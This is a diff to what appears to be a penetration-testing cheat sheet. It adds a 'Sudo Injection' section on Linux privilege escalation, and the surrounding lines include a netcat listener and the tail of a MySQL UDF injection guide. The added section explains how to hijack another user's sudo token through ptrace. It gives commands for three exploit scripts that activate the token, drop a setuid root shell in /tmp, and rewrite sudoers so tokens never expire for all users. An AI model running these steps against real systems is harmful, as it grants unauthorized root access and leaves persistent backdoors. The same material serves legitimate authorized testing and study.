@@ -1064,7 +1064,7 @@ nc -lvnp 9999
 id && whoami
 ```
 
-# MySQL UDF (User-Defined Functions) Code (UDF) Injection
+# MySQL UDF (User-Defined Functions) Code (UDF) Injectionn
 
 User Defined Function (UDF) is a piece of code that extends the functionality of a MySQL server by adding a new function that behaves just like a native (built-in) MySQL function, such as abs() or concat()
 UDFs are useful when you need to extend the functionality of your MySQL server
@@ -1148,7 +1148,28 @@ id && whoami
 // Ensure that the path to the UDF (.so) is correct
 // Replace IP & Port
 ```
+# Sudo Injection (Sudo Token)
 
-
+linpeas.sh => ptrace vulnerability
+In the scenario where you have a shell as a user with sudo privileges but you don't know the password of the user, you can wait him to execute some command using // sudo. Then, you can access the token of the session where sudo was used and use it to execute anything as sudo (privilege escalation).
+Requirements to escalate privileges:
+- You already have a shell as user "sampleuser"
+- "sampleuser" have used sudo to execute something in the last 15mins (by default that's the duration of the sudo token that allows to use sudo without introducing any password)
+- cat /proc/sys/kernel/yama/ptrace_scope is 0
+- gdb is accessible (you can be able to upload it)
+(You can temporarily enable ptrace_scope with echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope or permanently modifying /etc/sysctl.d/10-ptrace.conf and  setting kernel.yama.ptrace_scope = 0)
+If all these requirements are met, you can escalate privileges using: https://github.com/nongiach/sudo_inject
+The first exploit (exploit.sh) will create the binary activate_sudo_token in /tmp. You can use it to activate the sudo token in your session (you won't get  automatically a root shell, do sudo su):
+```
+bash exploit.sh
+/tmp/activate_sudo_token
+sudo su
+//The second exploit (exploit_v2.sh) will create a sh shell in /tmp owned by root with setuid
+bash exploit_v2.sh
+/tmp/sh -p
+//The third exploit (exploit_v3.sh) will create a sudoers file that makes sudo tokens eternal and allows all users to use sudo
+bash exploit_v3.sh
+sudo su
+```
 
 
